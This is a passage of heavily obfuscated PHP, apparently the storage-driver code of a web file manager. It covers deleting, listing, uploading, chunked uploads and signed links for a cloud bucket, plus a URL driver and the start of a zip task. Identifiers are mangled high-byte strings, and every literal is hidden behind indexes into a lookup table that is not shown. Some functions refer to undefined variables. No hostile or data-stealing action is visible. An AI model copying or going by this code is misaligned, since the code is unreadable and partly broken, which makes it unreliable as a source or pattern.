$¶±¹ß¦Ú) { $¹é¶òÃ³ =& $_SERVER[¯µç›È¢]; $¼ûì·îã = array($¹é¶òÃ³[1472] . "\x2f{$this->bucket}\x2f{$Ÿäå©ÅÙ}", $¹é¶òÃ³[1471]); $¤¹½‡Öş = $this->ussRequest($¶±¹ß¦Ú, $¹é¶òÃ³[237], !1, $¼ûì·îã); return $¤¹½‡Öş[$¹é¶òÃ³[1201]] ? !0 : $this->getPathOuter($¶±¹ß¦Ú); } public function delFile($Ü¢ Êò‡) { $åÊİÀ ° =& $_SERVER[¯µç›È¢]; $·º÷‡ = $this->ussRequest($Ü¢ Êò‡, $åÊİÀ °[1473]); return $·º÷‡[$åÊİÀ °[1201]] ? !0 : !1; } public function delFolder($‹¬ üóó) { $ç±»ª¥ =& $_SERVER[¯µç›È¢]; if (!$this->exist($‹¬ üóó)) { return !0; } $this->listItemCache = !1; $›÷Î—½Õ = $‹´ÜÍÛâ = array(); $this->fileList($‹¬ üóó, $›÷Î—½Õ, $‹´ÜÍÛâ, !0); $this->listItemCache = !0; foreach ($‹´ÜÍÛâ as $ŸÏ’şÛ) { $í±š„ = $this->ussRequest($ŸÏ’şÛ[$ç±»ª¥[32]], $ç±»ª¥[1473]); if (!$í±š„[$ç±»ª¥[1201]]) { return !1; } } foreach ($›÷Î—½Õ as $·î»µšñ) { $í±š„ = $this->ussRequest($·î»µšñ, $ç±»ª¥[1473]); if (!$í±š„[$ç±»ª¥[1201]]) { return !1; } } $í±š„ = $this->ussRequest($‹¬ üóó, $ç±»ª¥[1473]); return $í±š„[$ç±»ª¥[1201]]; } public function rename($ë¡‚è–û, $›¦ôñäü) { if ($this->isFile($ë¡‚è–û)) { $›¦ôñäü = get_path_father($ë¡‚è–û) . $›¦ôñäü; return $this->moveFile($ë¡‚è–û, $›¦ôñäü); } return $this->renameObject($ë¡‚è–û, $›¦ôñäü); } public function fileInfo($ª¿çåÜã, $åï¨å¡ = false, $ù«È²çó = array()) { $Ğâá³×¹ =& $_SERVER[¯µç›È¢]; $Í¯˜ùš€ = array($Ğâá³×¹[32] => $this->pathThis($ª¿çåÜã), $Ğâá³×¹[88] => $this->getPathOuter($Ğâá³×¹[8] . $ª¿çåÜã), $Ğâá³×¹[33] => $Ğâá³×¹[206], $Ğâá³×¹[90] => isset($ù«È²çó[$Ğâá³×¹[90]]) ? $ù«È²çó[$Ğâá³×¹[90]] : 0, $Ğâá³×¹[181] => $this->ext($ª¿çåÜã)); if ($åï¨å¡) { return $Í¯˜ùš€; } $Í¯˜ùš€[$Ğâá³×¹[207]] = $Í¯˜ùš€[$Ğâá³×¹[96]] = 0; $Í¯˜ùš€[$Ğâá³×¹[208]] = $Í¯˜ùš€[$Ğâá³×¹[209]] = !0; if (empty($ù«È²çó)) { $ù«È²çó = $this->objectMeta($ª¿çåÜã); if (!$ù«È²çó) { return $Í¯˜ùš€; } } $Í¯˜ùš€[$Ğâá³×¹[207]] = intval($ù«È²çó[$Ğâá³×¹[1474]]); $Í¯˜ùš€[$Ğâá³×¹[96]] = intval($ù«È²çó[$Ğâá³×¹[1475]]); $Í¯˜ùš€[$Ğâá³×¹[90]] = $ù«È²çó[$Ğâá³×¹[90]]; return $Í¯˜ùš€; } public function folderInfo($Õõˆ“ìµ, $Ùè®¥Ù = false) { $óõªØÜù =& $_SERVER[¯µç›È¢]; $‚ó×îİ = array($óõªØÜù[32] => $this->pathThis($Õõˆ“ìµ), $óõªØÜù[88] => $this->getPathOuter($óõªØÜù[8] . $Õõˆ“ìµ), $óõªØÜù[33] => $óõªØÜù[89]); if ($Ùè®¥Ù) { return $‚ó×îİ; } $‚ó×îİ[$óõªØÜù[207]] = $‚ó×îİ[$óõªØÜù[96]] = 0; $‚ó×îİ[$óõªØÜù[208]] = $‚ó×îİ[$óõªØÜù[209]] = !0; if (empty($îÁ•ï›¨)) { $îÁ•ï›¨ = $this->objectMeta($Õõˆ“ìµ); if (!$îÁ•ï›¨) { return $‚ó×îİ; } } $‚ó×îİ[$óõªØÜù[207]] = intval($îÁ•ï›¨[$óõªØÜù[1474]]); $‚ó×îİ[$óõªØÜù[96]] = intval($îÁ•ï›¨[$óõªØÜù[1475]]); return $‚ó×îİ; } private function listObjs($‰öÆ“˜, $ş ©Ş» = 0, $èíŸŠ¨ = 1000) { $º³ıÀëƒ =& $_SERVER[¯µç›È¢]; $òıù™ù€ = array($º³ıÀëƒ[1476], $º³ıÀëƒ[1477] . $èíŸŠ¨); if ($ş ©Ş») { $òıù™ù€[] = $º³ıÀëƒ[1478] . $ş ©Ş»; } $ÀÔå¡²ı = $this->ussRequest($‰öÆ“˜, $º³ıÀëƒ[239], !1, $òıù™ù€); return !$ÀÔå¡²ı[$º³ıÀëƒ[1201]] ? !1 : $ÀÔå¡²ı[$º³ıÀëƒ[1203]]; } private function fileList($®Ûï—š, &$ùØì‹¡Ş, &$»ÂÛªş, $ûª–Ä“ô = false) { $µŞñµˆÑ =& $_SERVER[¯µç›È¢]; $ƒ½ÅØá = $µŞñµˆÑ[12]; $¬Ç­’à¡ = 1000; $Ÿº§ ó‹ = rtrim($®Ûï—š, $µŞñµˆÑ[8]) . $µŞñµˆÑ[8]; $±×Û¦úî = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $æ’›Õ‰¢ = $this->listObjs($®Ûï—š, $ƒ½ÅØá, $¬Ç­’à¡); if (!$æ’›Õ‰¢) { return !1; } $ƒ½ÅØá = isset($æ’›Õ‰¢[$µŞñµˆÑ[1479]]) ? $æ’›Õ‰¢[$µŞñµˆÑ[1479]] : $µŞñµˆÑ[12]; $‚ñŒÃÁ¬ = isset($æ’›Õ‰¢[$µŞñµˆÑ[1480]]) ? $æ’›Õ‰¢[$µŞñµˆÑ[1480]] : array(); foreach ($‚ñŒÃÁ¬ as $œ˜¬©Á ) { $„’Ğ²ï = $œ˜¬©Á [$µŞñµˆÑ[33]] == $µŞñµˆÑ[89] ? !0 : !1; $²Ìô’³è = ltrim($Ÿº§ ó‹ . $œ˜¬©Á [$µŞñµˆÑ[32]], $µŞñµˆÑ[8]) . ($„’Ğ²ï ? $µŞñµˆÑ[8] : $µŞñµˆÑ[12]); $òÇÓüÙœ = array($µŞñµˆÑ[32] => $²Ìô’³è, $µŞñµˆÑ[33] => $„’Ğ²ï ? $µŞñµˆÑ[89] : $µŞñµˆÑ[206], $µŞñµˆÑ[90] => $œ˜¬©Á [$µŞñµˆÑ[345]], $µŞñµˆÑ[1475] => $œ˜¬©Á [$µŞñµˆÑ[1481]]); if ($±×Û¦úî) { $this->cacheMethod($µŞñµˆÑ[212], $²Ìô’³è, $„’Ğ²ï); $this->cacheMethod($µŞñµˆÑ[213], $²Ìô’³è, $òÇÓüÙœ); } if ($„’Ğ²ï) { $ùØì‹¡Ş[] = $²Ìô’³è; if ($ûª–Ä“ô) { $this->fileList($²Ìô’³è, $ùØì‹¡Ş, $»ÂÛªş, $ûª–Ä“ô); } continue; } $»ÂÛªş[] = $òÇÓüÙœ; } if (count($‚ñŒÃÁ¬) < $¬Ç­’à¡) { break; } } if ($±×Û¦úî) { $this->cacheMethod($µŞñµˆÑ[212], $®Ûï—š, !0); } } public function listPath($úçˆ‘Ø–, $Ïß‰ßÉ = false) { $Ê©ì‹çŸ =& $_SERVER[¯µç›È¢]; $ÈÈ®«¹ = $¹éò»Šâ = array(); $this->fileList($úçˆ‘Ø–, $ÈÈ®«¹, $¹éò»Šâ); foreach ($ÈÈ®«¹ as $ŸÑ‹ğ“ù => $åç‘Ù) { $ÈÈ®«¹[$ŸÑ‹ğ“ù] = $this->folderInfo($åç‘Ù, $Ïß‰ßÉ); } foreach ($¹éò»Šâ as $ŸÑ‹ğ“ù => $åç‘Ù) { $¹éò»Šâ[$ŸÑ‹ğ“ù] = $this->fileInfo($åç‘Ù[$Ê©ì‹çŸ[32]], $Ïß‰ßÉ, $åç‘Ù); } return array($Ê©ì‹çŸ[87] => $ÈÈ®«¹, $Ê©ì‹çŸ[86] => $¹éò»Šâ); } public function has($çğÀĞ‹û, $¸ïáÜ¶Ç = false, $öñ¡½ÂÑ = true) { $Ã€õ¹İ¸ =& $_SERVER[¯µç›È¢]; $î¦è¦–€ = $Ã€õ¹İ¸[12]; $ïúÄ«³õ = 500; $éÃ¨‰¶ä = 0; $úãµÏ¹˜ = 0; $Ïùö’”„ = rtrim($çğÀĞ‹û, $Ã€õ¹İ¸[8]) . $Ã€õ¹İ¸[8]; while (!0) { check_abort(); $èÑÎëáò = $this->listObjs($çğÀĞ‹û, $î¦è¦–€, $ïúÄ«³õ); if (!$èÑÎëáò) { return !1; } $î¦è¦–€ = isset($èÑÎëáò[$Ã€õ¹İ¸[1479]]) ? $èÑÎëáò[$Ã€õ¹İ¸[1479]] : $Ã€õ¹İ¸[12]; $¤ÕĞöÄ– = isset($èÑÎëáò[$Ã€õ¹İ¸[1480]]) ? $èÑÎëáò[$Ã€õ¹İ¸[1480]] : array(); if (empty($¤ÕĞöÄ–)) { break; } $Æˆ‡›ªÀ = array_filter($¤ÕĞöÄ–, function ($ã±€ í) { $‚¶ˆÏ½ =& $_SERVER[¯µç›È¢]; return $ã±€ í[$‚¶ˆÏ½[33]] == $‚¶ˆÏ½[89]; }); $ÏººÔ = count($¤ÕĞöÄ–); $Æˆ‡›ªÀ = count($Æˆ‡›ªÀ); $£Ä¢‹ÑÍ = $ÏººÔ - $Æˆ‡›ªÀ; if ($¸ïáÜ¶Ç) { $úãµÏ¹˜ += $Æˆ‡›ªÀ; $éÃ¨‰¶ä += $£Ä¢‹ÑÍ; if ($ÏººÔ < $ïúÄ«³õ) { break; } continue; } if ($öñ¡½ÂÑ) { if ($£Ä¢‹ÑÍ) { return !0; } } else { if ($Æˆ‡›ªÀ) { return !0; } } if ($ÏººÔ < $ïúÄ«³õ) { break; } } if ($¸ïáÜ¶Ç) { return array($Ã€õ¹İ¸[216] => $éÃ¨‰¶ä, $Ã€õ¹İ¸[217] => $úãµÏ¹˜); } return !1; } public function listAll($™ùˆŒè) { $€ƒ–»›³ =& $_SERVER[¯µç›È¢]; $¾ÄóÚô¥ = $È‹üêå¦ = array(); $this->fileList($™ùˆŒè, $¾ÄóÚô¥, $È‹üêå¦, !0); $Š¹î’Å” = array(); foreach ($È‹üêå¦ as $œ´™ğ¯Î) { $Š¹î’Å”[$œ´™ğ¯Î[$€ƒ–»›³[32]]] = $œ´™ğ¯Î[$€ƒ–»›³[90]]; } foreach ($¾ÄóÚô¥ as $œ´™ğ¯Î) { if (is_string($œ´™ğ¯Î)) { $Š¹î’Å”[$œ´™ğ¯Î] = 0; } } return $this->listAllFiles($™ùˆŒè, array_keys($Š¹î’Å”), $Š¹î’Å”); } public function canRead($Í­Øğ«) { return $this->exist($Í­Øğ«) ? !0 : !1; } public function canWrite($¶ÁüîÏä) { return $this->exist($¶ÁüîÏä) ? !0 : !1; } public function getContent($„»²Å°¤) { return $this->fileSubstr($„»²Å°¤, 0, -1); } public function setContent($Êõ½ãŸ, $Àš‡¯èÍ = '') { $©€¾‘¿Ä =& $_SERVER[¯µç›È¢]; if (!$Àš‡¯èÍ) { $¹ì×´ôš = $this->ussRequest($Êõ½ãŸ, $©€¾‘¿Ä[235]); return $¹ì×´ôš[$©€¾‘¿Ä[1201]]; } $¤ÑˆÚ° = $this->tempFile($this->pathThis($Êõ½ãŸ)); file_put_contents($¤ÑˆÚ°, $Àš‡¯èÍ); if ($this->upload($Êõ½ãŸ, $¤ÑˆÚ°)) { $this->tempFileRemve($¤ÑˆÚ°); return !0; } return !1; } public function fileSubstr($ŞŠµ¡ó, $…óÓÅõó, $êûØÓ·Á) { $®Ãîµ•€ =& $_SERVER[¯µç›È¢]; if (!($ôÍµ‡ÒÏ = $this->link($ŞŠµ¡ó))) { return !1; } $­ÅØÉì = !1; if ($êûØÓ·Á > 0) { $ìéã“‰ = $…óÓÅõó + $êûØÓ·Á - 1; $­ÅØÉì = array($®Ãîµ•€[1442] . $…óÓÅõó . $®Ãîµ•€[465] . $ìéã“‰); } $›»’ø„Õ = url_request($ôÍµ‡ÒÏ, $®Ãîµ•€[239], !1, $­ÅØÉì); return $›»’ø„Õ[$®Ãîµ•€[767]] ? $›»’ø„Õ[$®Ãîµ•€[1203]] : !1; } public function upload($ËâçİÖ, $ÙƒÁèô, $Åü…šÑ = false, $‹‡ÃÉåÂ = REPEAT_REPLACE) { $à‡‹óà¼ =& $_SERVER[¯µç›È¢]; $¹¢“×Â = IO::size($ÙƒÁèô); if ($¹¢“×Â <= 1024 * 1024 * 200) { $¢ÎÃ®¯ = array($à‡‹óà¼[1482] . $ÙƒÁèô); $Í–Ä³¸ = $this->ussRequest($ËâçİÖ, $à‡‹óà¼[237], $¢ÎÃ®¯); return $Í–Ä³¸[$à‡‹óà¼[1201]] ? $this->getPathOuter($ËâçİÖ) : !1; } $òññÎîâ = 1024 * 1024 * 10; $ı‡Øã¬¬ = array($à‡‹óà¼[1483], $à‡‹óà¼[1484] . $¹¢“×Â, $à‡‹óà¼[1485], $à‡‹óà¼[1486] . $òññÎîâ); $Í–Ä³¸ = $this->ussRequest($ËâçİÖ, $à‡‹óà¼[237], !1, $ı‡Øã¬¬); if (!$Í–Ä³¸[$à‡‹óà¼[1201]]) { return !1; } $‘ÚŒØïá = $Í–Ä³¸[$à‡‹óà¼[1203]]; $ñÉ¤Øš‘ = 0; $”âşÛÍĞ = $‘ÚŒØïá[$à‡‹óà¼[1487]]; $¥¤ü¾ğ = fopen($ÙƒÁèô, $à‡‹óà¼[1391]); if (!$¥¤ü¾ğ) { return !1; } do { $…ãØáŒ = $‘ÚŒØïá[$à‡‹óà¼[1488]]; fseek_64($¥¤ü¾ğ, $ñÉ¤Øš‘); $š¬Î¡½ = fread($¥¤ü¾ğ, $…ãØáŒ); $âÖ†¯Ï = 0; do { $âÖ†¯Ï++; $‘ÚŒØïá = $this->uploadPart($ËâçİÖ, $‘ÚŒØïá, $š¬Î¡½); } while (!$‘ÚŒØïá && $âÖ†¯Ï < 3); if (!$‘ÚŒØïá) { return !1; } $”âşÛÍĞ = $‘ÚŒØïá[$à‡‹óà¼[1487]]; $ñÉ¤Øš‘ += $…ãØáŒ; } while ($”âşÛÍĞ != -1); fclose($¥¤ü¾ğ); $ı‡Øã¬¬ = array($à‡‹óà¼[1489], $à‡‹óà¼[1490] . $‘ÚŒØïá[$à‡‹óà¼[1491]], $à‡‹óà¼[1485]); $Í–Ä³¸ = $this->ussRequest($ËâçİÖ, $à‡‹óà¼[237], !1, $ı‡Øã¬¬); return $Í–Ä³¸[$à‡‹óà¼[1201]] ? $this->getPathOuter($²±ÆÎ) : !1; } private function uploadPart($üÄ„‹ß×, $àÍÍÈıÙ, &$ ´¶ıá) { $ĞüÇ‡´€ =& $_SERVER[¯µç›È¢]; $ßÅñÅÚÑ = array($ĞüÇ‡´€[1492], $ĞüÇ‡´€[1490] . $àÍÍÈıÙ[$ĞüÇ‡´€[1491]], $ĞüÇ‡´€[1493] . $àÍÍÈıÙ[$ĞüÇ‡´€[1487]], $ĞüÇ‡´€[153] . $àÍÍÈıÙ[$ĞüÇ‡´€[1488]]); $­‘™ªó = $this->ussRequest($üÄ„‹ß×, $ĞüÇ‡´€[237], $ ´¶ıá, $ßÅñÅÚÑ); return !$­‘™ªó[$ĞüÇ‡´€[1201]] ? $­‘™ªó[$ĞüÇ‡´€[1201]] : $­‘™ªó[$ĞüÇ‡´€[1203]]; } public function uploadFormData($õï³›„®, $â¶šòüÆ = 3600) { return $this->uploadPolicy($õï³›„®, $â¶šòüÆ); } public function multiUploadFormData($÷ñœ¹Öò, $ÔÈé¨›Ğ = 3600) { $è¨¯æ =& $_SERVER[¯µç›È¢]; $ÈäßøÕ‹ = (int) $GLOBALS[$è¨¯æ[7]][$è¨¯æ[90]]; return $this->uploadPolicy($÷ñœ¹Öò, $ÔÈé¨›Ğ, $ÈäßøÕ‹); } private function uploadPolicy($’…ú®ÁÃ, $¿›ÑÔö´ = 3600, $È›ï±¥° = 0) { $É´¤œŠ— =& $_SERVER[¯µç›È¢]; $µÚ‡ÅäÜ = $É´¤œŠ—[8] . $this->bucket; $ğì€ë„ù = gmdate($É´¤œŠ—[1427]); $¨ßê²›½ = array($É´¤œŠ—[1494] => $this->bucket, $É´¤œŠ—[1495] => $’…ú®ÁÃ, $É´¤œŠ—[1496] => time() + $¿›ÑÔö´, $É´¤œŠ—[1497] => $ğì€ë„ù); if ($È›ï±¥°) { $¨ßê²›½[$É´¤œŠ—[1407]] = $È›ï±¥°; } $ÏµÜ²Îò = base64_encode(json_encode($¨ßê²›½)); $ÕöÊ³Ğ = base64_encode(hash_hmac($É´¤œŠ—[1464], "\120\x4f\x53\x54\46{$µÚ‡ÅäÜ}\46{$ğì€ë„ù}\x26{$ÏµÜ²Îò}", md5("{$this->userpass}"), !0)); $îÈĞÎ×‹ = array($É´¤œŠ—[1332] => $ÏµÜ²Îò, $É´¤œŠ—[1498] => "\125\120\x59\x55\x4e\x20{$this->username}\72{$ÕöÊ³Ğ}", $É´¤œŠ—[188] => $this->endpoint . $µÚ‡ÅäÜ); return $îÈĞÎ×‹; } public function download($ÑÜ“¦¯, $úà–»«¦) { $Ò³°ß…ª = IO::getPathInner(IO::mkfile($úà–»«¦)); if (!($ÂŸ·ë¾É = $this->link($ÑÜ“¦¯))) { return !1; } $¡‚ø›ÑÔ = 0; $»áÇàïö = 1024 * 200; $ØÖ¤ƒÜ = fopen($Ò³°ß…ª, $_SERVER[¯µç›È¢][1448]); while (!0) { $ø€¸ş  = $this->fileSubstr($ÑÜ“¦¯, $¡‚ø›ÑÔ, $»áÇàïö); if ($ø€¸ş  === !1) { return !1; } fwrite($ØÖ¤ƒÜ, $ø€¸ş ); $¡‚ø›ÑÔ += $»áÇàïö; if (strlen($ø€¸ş ) < $»áÇàïö) { break; } } fclose($ØÖ¤ƒÜ); return $úà–»«¦; } public function link($Î¢Õà‹—, $¯òËŸÍ÷ = array()) { $ƒùğì›Ê =& $_SERVER[¯µç›È¢]; $Î¢Õà‹— = trim($Î¢Õà‹—, $ƒùğì›Ê[8]); if (!empty($this->token)) { $¶¾…ÂıÁ = strtotime(date($ƒùğì›Ê[1499])); $Û¾ıüø´ = substr(md5($this->token . $ƒùğì›Ê[292] . $¶¾…ÂıÁ . $ƒùğì›Ê[1500] . $Î¢Õà‹—), 12, 8) . $¶¾…ÂıÁ; $¯òËŸÍ÷[] = $ƒùğì›Ê[1501] . $Û¾ıüø´; } $ÁÊ¸–Ã = !empty($¯òËŸÍ÷) ? $ƒùğì›Ê[83] . implode($ƒùğì›Ê[292], $¯òËŸÍ÷) : $ƒùğì›Ê[12]; return $this->getHost() . $ƒùğì›Ê[8] . $Î¢Õà‹— . $ÁÊ¸–Ã; } public function fileOut($üèºÜå…, $œŠ¬Ÿ•ó = false, $«–‹õüõ = false, $Úå§¬Ìé = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($üèºÜå…, $œŠ¬Ÿ•ó, $«–‹õüõ, $Úå§¬Ìé); } if (!$«–‹õüõ) { $«–‹õüõ = $this->pathThis($üèºÜå…); } $³ÓäÉ…Ä = $œŠ¬Ÿ•ó ? array($_SERVER[¯µç›È¢][1502] . rawurlencode($«–‹õüõ)) : array(); $¡”’ƒ²â = $this->link($üèºÜå…, $³ÓäÉ…Ä); $this->fileOutLink($¡”’ƒ²â); } public function fileOutServer($ñ¢Êêù™, $İ·’´ÚÔ = false, $°å°Òä˜ = false, $ı²Ÿúê‡ = '') { parent::fileOut($ñ¢Êêù™, $İ·’´ÚÔ, $°å°Òä˜, $ı²Ÿúê‡); } public function fileOutImage($«Í’àÜß, $Ğ±‰‡‹„ = 250) { $¿ÏİöÚÖ = $this->link($«Í’àÜß . $_SERVER[¯µç›È¢][1503] . $Ğ±‰‡‹„); $this->fileOutLink($¿ÏİöÚÖ); } public function fileOutImageServer($‘Ş»•Ûî, $ íÃÒ½ = 250) { parent::fileOutImage($‘Ş»•Ûî, $ íÃÒ½); } public function hashMd5($µÓÂ˜Ò) { $µ†İ…à  =& $_SERVER[¯µç›È¢]; $Ô„’ÂÁÀ = $this->_objectMeta($µÓÂ˜Ò); return isset($Ô„’ÂÁÀ[$µ†İ…à [221]]) ? $Ô„’ÂÁÀ[$µ†İ…à [221]] : !1; } public function size($Í÷°¬¢É) { $²š“ìÊ = $this->objectMeta($Í÷°¬¢É); return $²š“ìÊ ? $²š“ìÊ[$_SERVER[¯µç›È¢][90]] : 0; } public function info($°ãøÓ·Š) { if ($this->isFolder($°ãøÓ·Š)) { return $this->folderInfo($°ãøÓ·Š); } else { if ($this->isFile($°ãøÓ·Š)) { return $this->fileInfo($°ãøÓ·Š); } } return !1; } public function exist($­¸´¶õá) { return $this->isFile($­¸´¶õá) || $this->isFolder($­¸´¶õá); } public function isFile($ÁÈ°ï·Ì) { return !$this->isFolder($ÁÈ°ï·Ì) && $this->objectMeta($ÁÈ°ï·Ì); } public function isFolder($ÍôèşŒô) { return $this->cacheMethod($_SERVER[¯µç›È¢][212], $ÍôèşŒô); } protected function objectMeta($Úø«úÓ°) { return $this->cacheMethod($_SERVER[¯µç›È¢][213], $Úø«úÓ°); } protected function _objectMeta($åÙÂó‹”) { $‰ÆÁâ¢ =& $_SERVER[¯µç›È¢]; if ($åÙÂó‹” == $‰ÆÁâ¢[12] || $åÙÂó‹” == $‰ÆÁâ¢[8]) { return array(); } $á¡Üš¢ = $this->ussRequest($åÙÂó‹”, $‰ÆÁâ¢[1504]); if (!$á¡Üš¢[$‰ÆÁâ¢[1201]]) { return null; } $œ¼±ÎÓÍ = isset($á¡Üš¢[$‰ÆÁâ¢[1203]]) ? $á¡Üš¢[$‰ÆÁâ¢[1203]] : array(); if (!isset($œ¼±ÎÓÍ[$‰ÆÁâ¢[1505]])) { return null; } $Ëµæ¤–¥ = array($‰ÆÁâ¢[33] => isset($œ¼±ÎÓÍ[$‰ÆÁâ¢[1505]]) ? $œ¼±ÎÓÍ[$‰ÆÁâ¢[1505]] : null, $‰ÆÁâ¢[90] => isset($œ¼±ÎÓÍ[$‰ÆÁâ¢[1506]]) ? $œ¼±ÎÓÍ[$‰ÆÁâ¢[1506]] : null, $‰ÆÁâ¢[221] => isset($œ¼±ÎÓÍ[$‰ÆÁâ¢[1507]]) ? $œ¼±ÎÓÍ[$‰ÆÁâ¢[1507]] : null, $‰ÆÁâ¢[1474] => isset($œ¼±ÎÓÍ[$‰ÆÁâ¢[1508]]) ? $œ¼±ÎÓÍ[$‰ÆÁâ¢[1508]] : null); $Ëµæ¤–¥[$‰ÆÁâ¢[1475]] = isset($œ¼±ÎÓÍ[$‰ÆÁâ¢[1509]]) ? strtotime($œ¼±ÎÓÍ[$‰ÆÁâ¢[1509]]) : $Ëµæ¤–¥[$‰ÆÁâ¢[1474]]; return $Ëµæ¤–¥; } protected function _isFolder($îº¾ £) { $İ»ÎÓ¥ =& $_SERVER[¯µç›È¢]; if ($îº¾ £ == $İ»ÎÓ¥[12] || $îº¾ £ == $İ»ÎÓ¥[8]) { return !0; } $ºÜÏË±‰ = $this->_objectMeta($îº¾ £); return isset($ºÜÏË±‰[$İ»ÎÓ¥[33]]) && $ºÜÏË±‰[$İ»ÎÓ¥[33]] == $İ»ÎÓ¥[89] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ª–—ã« = false) { } public function exist($§çáİ´) { $ÓÙà°»Ë = $this->info($§çáİ´); return $ÓÙà°»Ë[$_SERVER[¯µç›È¢][208]]; } public function isFile($‹ù‚‡×­) { $ì“êºÃ” = $this->info($‹ù‚‡×­); return $ì“êºÃ”[$_SERVER[¯µç›È¢][208]]; } public function isFolder($À¦‘È) { return !1; } public function size($™ÇÇ¼Â¬) { $ŸšÓƒ”ù = $this->info($™ÇÇ¼Â¬); return $ŸšÓƒ”ù[$_SERVER[¯µç›È¢][90]]; } public function info($ƒËîÄŸı) { return $this->infoParse($ƒËîÄŸı); } public function infoAuth($½ÍµÒº‡) { return $this->infoParse($½ÍµÒº‡); } public function infoWithChildren($ÆıÆ›òÕ) { return $this->infoParse($ÆıÆ›òÕ); } public function infoFull($ñ—Ò˜ıí) { return $this->infoParse($ñ—Ò˜ıí); } private function infoParse($‹¸ß’€Õ) { $êö™ÊŞ =& $_SERVER[¯µç›È¢]; $­ØÖÙ± = $this->header($‹¸ß’€Õ); if (!$­ØÖÙ± || !$­ØÖÙ±[$êö™ÊŞ[767]]) { return !1; } $¢¾š‘Ëæ = _get($­ØÖÙ±, $êö™ÊŞ[345], 0); $ò¬¬›Şè = array($êö™ÊŞ[32] => $­ØÖÙ±[$êö™ÊŞ[32]], $êö™ÊŞ[88] => $‹¸ß’€Õ, $êö™ÊŞ[33] => $êö™ÊŞ[206], $êö™ÊŞ[90] => intval($¢¾š‘Ëæ), $êö™ÊŞ[181] => get_path_ext($­ØÖÙ±[$êö™ÊŞ[32]]), $êö™ÊŞ[1388] => $¢¾š‘Ëæ > 0 && $­ØÖÙ±[$êö™ÊŞ[1510]], $êö™ÊŞ[1389] => !1); return $ò¬¬›Şè; } private function header($ÚÒ§Ü˜İ) { $ÙÌ¬«êÑ =& $_SERVER[¯µç›È¢]; if (isset(self::$_cacheHeader[$ÚÒ§Ü˜İ])) { return self::$_cacheHeader[$ÚÒ§Ü˜İ]; } $ «—‹¥€ = isset($GLOBALS[$ÙÌ¬«êÑ[1511]]) ? $GLOBALS[$ÙÌ¬«êÑ[1511]] : !1; $GLOBALS[$ÙÌ¬«êÑ[1511]] = !0; self::$_cacheHeader[$ÚÒ§Ü˜İ] = url_header($ÚÒ§Ü˜İ); $GLOBALS[$ÙÌ¬«êÑ[1511]] = $ «—‹¥€; return self::$_cacheHeader[$ÚÒ§Ü˜İ]; } public function hashSimple($Æ€¯ª¾×, $ÀŠ—Ü… = false) { $Ô‰â°á =& $_SERVER[¯µç›È¢]; $¹ïîàÂà = $this->info($Æ€¯ª¾×); if (!$¹ïîàÂà || !$¹ïîàÂà[$Ô‰â°á[208]]) { return !1; } $˜Ô°çêæ = $¹ïîàÂà[$Ô‰â°á[90]]; $¨Ÿş¿Ó© = 200; $ÉöÑ«Ö‡ = 50; if ($˜Ô°çêæ <= $¨Ÿş¿Ó© * $ÉöÑ«Ö‡) { return md5($this->fileSubstr($Æ€¯ª¾×, 0, $˜Ô°çêæ)) . $˜Ô°çêæ; } $Šş„Œßı = intval($˜Ô°çêæ / $ÉöÑ«Ö‡); $Ø«Í·á = $Ô‰â°á[12]; $Ş­ÌÜ… = timeFloat(); $ÅüÒŠ¾± = 15; for ($àŒÏíáç = 0; $àŒÏíáç < $ÉöÑ«Ö‡; $àŒÏíáç++) { if (timeFloat() - $Ş­ÌÜ… > $ÅüÒŠ¾±) { return !1; } $ùÌôŒÂí = $this->fileSubstr($Æ€¯ª¾×, $Šş„Œßı * $àŒÏíáç, $¨Ÿş¿Ó©); if (!$ùÌôŒÂí) { return !1; } $Ø«Í·á .= $ùÌôŒÂí; } $Ø«Í·á .= $this->fileSubstr($Æ€¯ª¾×, $˜Ô°çêæ - $¨Ÿş¿Ó©, $¨Ÿş¿Ó©); return md5($Ø«Í·á) . $˜Ô°çêæ; } public function getContent($îİ°Øö) { return $this->fileSubstr($îİ°Øö); } public function fileSubstr($ÁÆ™ò—², $ˆÆõãµ¦ = 0, $¢µìˆ“ = -1) { $Âôï¯¯ã =& $_SERVER[¯µç›È¢]; $âúºµ¾ = $this->info($ÁÆ™ò—²); if (!$âúºµ¾ || !$âúºµ¾[$Âôï¯¯ã[208]] && $âúºµ¾[$Âôï¯¯ã[90]] > 1024 * 1024 * 10) { return !1; } if ($¢µìˆ“ === -1) { $¢µìˆ“ = $âúºµ¾[$Âôï¯¯ã[90]]; } if ($¢µìˆ“ == 0) { return $Âôï¯¯ã[12]; } $¼ÁõşË¦ = array($Âôï¯¯ã[1512] . $ˆÆõãµ¦ . $Âôï¯¯ã[799] . ($ˆÆõãµ¦ + $¢µìˆ“ - 1)); $Õ¬‹ˆòº = url_request($ÁÆ™ò—², $Âôï¯¯ã[239], !1, $¼ÁõşË¦, !1, !1, 1); return $Õ¬‹ˆòº[$Âôï¯¯ã[1203]] ? $Õ¬‹ˆòº[$Âôï¯¯ã[1203]] : $Âôï¯¯ã[12]; } public function download($Â”òÚ§œ, $€Ûô÷ì) { Downloader::start($Â”òÚ§œ, $€Ûô÷ì); return $€Ûô÷ì; } } goto càöŠ¸”¦; aİ¶—Ÿ˜‰Ç: class TaskZip extends TaskFileTransfer { protected function startAfter() { $œâÔ¤üö =& $_SERVER[¯µç›È¢]; parent::startAfter(); Hook::bind($œâÔ¤üö[1761], array($this, $œâÔ¤üö[1756])); $ğÄöÄí† =& $this->task; $ğÄöÄí†[$œâÔ¤üö[1758]] = $œâÔ¤üö[1209]; if (!$ğÄöÄí†[$œâÔ¤üö[1566]]) { $ğÄöÄí†[$œâÔ¤üö[1566]] = LNG($œâÔ¤üö[1762]); } } protected function endAfter() { $ğ¾ñô“ã =& $_SERVER[¯µç›È¢]; parent::endAfter(); Hook::unbind($ğ¾ñô“ã[1761], array($this, $ğ¾ñô“ã[1756])); } public function updateAfter() { $óÁŞ¹Ôâ =& $_SERVER[¯µç›È¢]; $¡’åÂ­ö =& $this->task; if (!$¡’åÂ­ö[$óÁŞ¹Ôâ[803]] || !$¡’åÂ­ö[$óÁŞ¹Ôâ[780]]) { return; } if ($¡’åÂ­ö[$óÁŞ¹Ôâ[1758]] == $óÁŞ¹Ôâ[1209]) { $Êç§ªŸÛ = $¡’åÂ­ö[$óÁŞ¹Ôâ[1715]]; if ($¡’åÂ­ö[$óÁŞ¹Ôâ[1716]] != 